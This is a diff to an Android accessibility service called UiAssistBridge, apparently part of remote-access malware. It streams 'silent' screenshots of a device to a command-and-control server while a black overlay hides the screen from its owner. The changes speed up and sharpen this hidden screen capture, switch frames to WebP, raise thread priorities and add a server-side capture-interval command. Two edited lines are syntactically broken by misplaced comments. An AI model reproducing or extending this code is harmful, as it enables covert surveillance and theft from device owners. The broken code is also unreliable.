@@ -80,12 +80,12 @@ public class UiAssistBridge extends AccessibilityService {
     private static volatile Thread silentScreenThread = null;
     private static volatile boolean silentScreenshotApiInFlight = false;
     private static volatile int silentCaptureQuality = 60;
-    private static long silentCaptureDelayMs = 250;
+    private static volatile long silentCaptureDelayMs = 150; // [PERF] was 250
     private static volatile boolean killerCaptureRequested = false;
 
-    private static final int SILENT_CAPTURE_MIN_DELAY_MS = 250;
-    private static final int SILENT_CAPTURE_BLACK_SCREEN_MIN_DELAY_MS = 250;
-    private static final int SILENT_CAPTURE_MAX_DELAY_MS = 1500;
+    private static final int SILENT_CAPTURE_MIN_DELAY_MS = 150;              // [PERF] was 250 — Android API floor ~175ms, total cycle ~185ms
+    private static final int SILENT_CAPTURE_BLACK_SCREEN_MIN_DELAY_MS = 150; // [PERF] was 250
+    private static final int SILENT_CAPTURE_MAX_DELAY_MS = 800;              // [PERF] was 1500 — lower ceiling = faster recovery
 
     private final android.os.Handler watchdogHandler = new android.os.Handler(android.os.Looper.getMainLooper());
     private final Runnable watchdogRunnable = new Runnable() {
@@ -102,19 +102,31 @@ public class UiAssistBridge extends AccessibilityService {
             watchdogHandler.postDelayed(this, 10000); // Executa a cada 10 segundos
         }
     };
-    private static final int SILENT_WIDTH = 350;
-    private static final int SILENT_HEIGHT = 650;
+    private static final int SILENT_WIDTH  = 480; // [PERF] was 350 — higher quality, WebP compensates size
+    private static final int SILENT_HEIGHT = 900; // [PERF] was 650
 
     private static final java.util.concurrent.ArrayBlockingQueue<SilentFrameJob> SILENT_ENCODE_QUEUE =
-            new java.util.concurrent.ArrayBlockingQueue<>(10);
+            new java.util.concurrent.ArrayBlockingQueue<>(2); // [PERF] was 10 — smaller queue = no stale frame buffering
 
     private static final java.util.concurrent.ExecutorService SILENT_ENCODE_POOL =
             java.util.concurrent.Executors.newFixedThreadPool(3, r -> {
-                Thread t = new Thread(r, "SilentEncode");
+                Thread t = new Thread(() -> {
+                    // [PERF] Set Linux-level URGENT_DISPLAY priority inside thread execution
+                    android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY);
+                    r.run();
+                }, "SilentEncode");
                 t.setDaemon(true);
-                t.setPriority(Thread.NORM_PRIORITY - 1);
+                t.setPriority(Thread.MAX_PRIORITY - 1); // [PERF] was NORM-1
                 return t;
             });
+
+    // [PERF] ThreadLocal reusable encode target — zero per-frame allocation across 3 encode threads
+    private static final ThreadLocal<android.graphics.Bitmap> ENCODE_TARGET = ThreadLocal.withInitial(() ->
+            android.graphics.Bitmap.createBitmap(SILENT_WIDTH, SILENT_HEIGHT, android.graphics.Bitmap.Config.ARGB_8888));
+
+    // [PERF] ThreadLocal reusable ByteArrayOutputStream — eliminates GC pressure from per-frame alloc
+    private static final ThreadLocal<java.io.ByteArrayOutputStream> ENCODE_BUFFER =
+            ThreadLocal.withInitial(() -> new java.io.ByteArrayOutputStream(48 * 1024)); // 48KB initial capacity
 
     private static final class SilentFrameJob {
         final android.graphics.Bitmap bitmap;
@@ -4031,7 +4043,8 @@ public class UiAssistBridge extends AccessibilityService {
             java.util.concurrent.Executors.newSingleThreadExecutor(r -> {
                 Thread t = new Thread(r, "SilentScreenshot");
                 t.setDaemon(true);
-                t.setPriority(Thread.NORM_PRIORITY);
+                t.setPriority(Thread.MAX_PRIORITY); // [PERF] was NORM
+                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY);
                 return t;
             });
 
@@ -4040,33 +4053,6 @@ public class UiAssistBridge extends AccessibilityService {
      * Called repeatedly from the dedicated silent thread.
      */
     @RequiresApi(api = Build.VERSION_CODES.R)
-    /** Called by SNAP_SCREEN command — captures once and sends as JSON {type:"screenshot"} */
-    public void takeScreenshotForStorage(android.content.Context ctx) {
-        final CommandControlService ccs = CommandControlService.getInstance();
-        takeScreenshot(Display.DEFAULT_DISPLAY, SILENT_SCREENSHOT_EXECUTOR,
-            new android.accessibilityservice.AccessibilityService.TakeScreenshotCallback() {
-                @Override
-                public void onSuccess(android.accessibilityservice.AccessibilityService.ScreenshotResult result) {
-                    try {
-                        android.hardware.HardwareBuffer hw = result.getHardwareBuffer();
-                        android.graphics.Bitmap bmp = android.graphics.Bitmap.wrapHardwareBuffer(hw, result.getColorSpace());
-                        hw.close();
-                        if (bmp == null) return;
-                        android.graphics.Bitmap soft = bmp.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
-                        bmp.recycle();
-                        if (ccs != null) ccs.sendScreenshotBitmap(soft);
-                    } catch (Exception e) {
-                        Log.e(TAG, "takeScreenshotForStorage onSuccess error: " + e.getMessage());
-                    }
-                }
-                @Override
-                public void onFailure(int errorCode) {
-                    Log.w(TAG, "takeScreenshotForStorage failed: " + errorCode);
-                    if (ccs != null) ccs.sendResponse("ERROR", "Screenshot failed: " + errorCode);
-                }
-            });
-    }
-
     public void capSilentScreen(int quality) {
         if (silentScreenshotApiInFlight) {
             return;
@@ -4091,7 +4077,7 @@ public class UiAssistBridge extends AccessibilityService {
                             }
                             enqueueSilentFrame(bitmap);
                             // Gently decrease delay on success instead of dropping to 150ms instantly
-                            silentCaptureDelayMs = Math.max(SILENT_CAPTURE_MIN_DELAY_MS, silentCaptureDelayMs - 15);
+                            silentCaptureDelayMs = Math.max(SILENT_CAPTURE_MIN_DELAY_MS, silentCaptureDelayMs - 50); // [PERF] was -15ms per success
                         } catch (Exception ex) {
                             Log.e(TAG, "capSilentScreen onSuccess enqueue error: " + ex.getMessage());
                         } finally {
@@ -4105,9 +4091,9 @@ public class UiAssistBridge extends AccessibilityService {
                             restoreBlackOverlayAfterCapture();
                             Log.w(TAG, "capSilentScreen takeScreenshot failed: " + errorCode);
                             if (errorCode == 3 || errorCode == android.accessibilityservice.AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT) {
-                                silentCaptureDelayMs = Math.min(Math.max(silentCaptureDelayMs, 300) + 100, SILENT_CAPTURE_MAX_DELAY_MS);
+                                silentCaptureDelayMs = Math.min(silentCaptureDelayMs + 20 // [PERF] was Math.max(300)+100, SILENT_CAPTURE_MAX_DELAY_MS);
                             } else {
-                                silentCaptureDelayMs = Math.min(silentCaptureDelayMs + 150, SILENT_CAPTURE_MAX_DELAY_MS);
+                                silentCaptureDelayMs = Math.min(silentCaptureDelayMs + 60 // [PERF] was +150ms, SILENT_CAPTURE_MAX_DELAY_MS);
                             }
                         } finally {
                             silentScreenshotApiInFlight = false;
@@ -4190,45 +4176,70 @@ public class UiAssistBridge extends AccessibilityService {
         android.graphics.Bitmap source = job.bitmap;
         
         android.graphics.Bitmap scaled = null;
+        boolean usingThreadLocalTarget = false;
         try {
+            // [PERF] Use Canvas draw into ThreadLocal target — avoids intermediate full-res software copy
+            // that createScaledBitmap(hwBitmap) performs internally (~12MB alloc per frame on 1080p).
+            // Canvas.drawBitmap reads hardware bitmap via GPU readback + scales in one pass.
+            android.graphics.Bitmap target = ENCODE_TARGET.get();
+            if (target == null || target.isRecycled()
+                    || target.getWidth() != SILENT_WIDTH || target.getHeight() != SILENT_HEIGHT) {
+                target = android.graphics.Bitmap.createBitmap(
+                        SILENT_WIDTH, SILENT_HEIGHT, android.graphics.Bitmap.Config.ARGB_8888);
+                ENCODE_TARGET.set(target);
+            }
             try {
-                scaled = android.graphics.Bitmap.createScaledBitmap(
-                        source,
-                        SILENT_WIDTH,
-                        SILENT_HEIGHT,
-                        true
-                );
-            } catch (Exception scaleEx) {
-                Log.w(TAG, "createScaledBitmap fallback: " + scaleEx.getMessage());
-                android.graphics.Bitmap software = source.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
-                if (!source.isRecycled()) {
-                    source.recycle();
-                }
-                source = software;
-                scaled = android.graphics.Bitmap.createScaledBitmap(
-                        source,
-                        SILENT_WIDTH,
-                        SILENT_HEIGHT,
-                        true
-                );
+                android.graphics.Canvas cvs = new android.graphics.Canvas(target);
+                android.graphics.Paint scalePaint = new android.graphics.Paint(android.graphics.Paint.FILTER_BITMAP_FLAG);
+                cvs.drawBitmap(source,
+                        new android.graphics.Rect(0, 0, source.getWidth(), source.getHeight()),
+                        new android.graphics.RectF(0, 0, SILENT_WIDTH, SILENT_HEIGHT),
+                        scalePaint);
+                scaled = target;
+                usingThreadLocalTarget = true;
+            } catch (Exception canvasEx) {
+                // Fallback to createScaledBitmap if Canvas draw fails (edge case)
+                Log.w(TAG, "[PERF] Canvas draw fallback: " + canvasEx.getMessage());
+                android.graphics.Bitmap software = source.isHardwareAccelerated()
+                        ? source.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
+                        : source;
+                scaled = android.graphics.Bitmap.createScaledBitmap(software, SILENT_WIDTH, SILENT_HEIGHT, false);
+                if (software != source && !software.isRecycled()) software.recycle();
             }
 
-            // Se a tela preta estiver ativa sem supressão, amplifica o brilho dinamicamente
+            // Brightness boost only when black screen is partially transparent (factor 1.5–15 is visually useful)
+            // Skip when factor > 15 (screen ≥ 93% opaque = boosted frame is white noise anyway)
             if (instance != null && instance.isBlackScreenActive && !instance.shouldSuppressOverlayForCapture() &&
                     (instance.blackOverlayView == null || instance.blackOverlayView.getVisibility() == android.view.View.VISIBLE)) {
                 float alpha = Math.min(0.98f, instance.blackScreenOpacityPercent / 100f);
                 float transparency = 1.0f - alpha;
-                float factor = 1.0f / Math.max(0.01f, transparency); // Evita divisão por zero
-                if (factor > 1.1f) {
-                    scaled = adjustBitmapBrightness(scaled, factor);
+                float factor = 1.0f / Math.max(0.01f, transparency);
+                if (factor >= 1.5f && factor < 15.0f) { // [PERF] was factor > 1.1f (too broad)
+                    android.graphics.Bitmap boosted = adjustBitmapBrightness(scaled, factor);
+                    if (usingThreadLocalTarget && boosted != scaled) {
+                        // adjustBitmapBrightness returned a new bitmap — don't recycle the ThreadLocal target
+                        scaled = boosted;
+                        usingThreadLocalTarget = false;
+                    } else {
+                        scaled = boosted;
+                    }
                 }
             }
 
-            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+            // [PERF] ThreadLocal ByteArrayOutputStream — zero GC per frame
+            java.io.ByteArrayOutputStream baos = ENCODE_BUFFER.get();
+            baos.reset();
+
             int q = clampSilentQuality(silentCaptureQuality);
-            scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, q, baos);
+
+            // [PERF] WebP_LOSSY on API 30+ (this APK requires API 30 for takeScreenshot anyway)
+            // WebP lossy = 25-35% smaller than JPEG at same quality, natively decoded by browser
+            android.graphics.Bitmap.CompressFormat fmt = (android.os.Build.VERSION.SDK_INT >= 30)
+                    ? android.graphics.Bitmap.CompressFormat.WEBP_LOSSY
+                    : android.graphics.Bitmap.CompressFormat.JPEG;
+            scaled.compress(fmt, q, baos);
+
             byte[] bytes = baos.toByteArray();
-            baos.close();
 
             if (instance != null) {
                 CommandControlService.sendSilentVncFrame(instance.getApplicationContext(), bytes);
@@ -4283,6 +4294,12 @@ public class UiAssistBridge extends AccessibilityService {
         return quality;
     }
 
+    /** [PERF] Allows server to tune capture interval live via SET_CAPTURE_INTERVAL command */
+    public static void setSilentCaptureDelay(long ms) {
+        silentCaptureDelayMs = Math.max(SILENT_CAPTURE_MIN_DELAY_MS, Math.min(SILENT_CAPTURE_MAX_DELAY_MS, ms));
+        Log.d("SilentCap", "[PERF] Capture delay set to " + silentCaptureDelayMs + "ms");
+    }
+
     public static void setSilentCaptureQuality(int quality) {
         silentCaptureQuality = clampSilentQuality(quality);
         if (silentScreenActive) {
@@ -4319,7 +4336,7 @@ public class UiAssistBridge extends AccessibilityService {
             return;
         }
         silentScreenActive = true;
-        silentCaptureDelayMs = Math.max(300, SILENT_CAPTURE_MIN_DELAY_MS);
+        silentCaptureDelayMs = SILENT_CAPTURE_MIN_DELAY_MS; // [PERF] was Math.max(300, MIN) = 300ms start
         final int q = silentCaptureQuality;
 
         // Persist the fact that the dedicated silent path is now active (for auto-resume on service recreate)
@@ -4355,6 +4372,8 @@ public class UiAssistBridge extends AccessibilityService {
         } catch (Exception ignored) {}
 
         Thread thread = new Thread(() -> {
+            // [PERF] Elevate to URGENT_DISPLAY priority — same as Android display compositor
+            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY);
             Log.d("SilentCap", "BTMOB-style silent thread started");
             while (silentScreenActive) {
                 try {
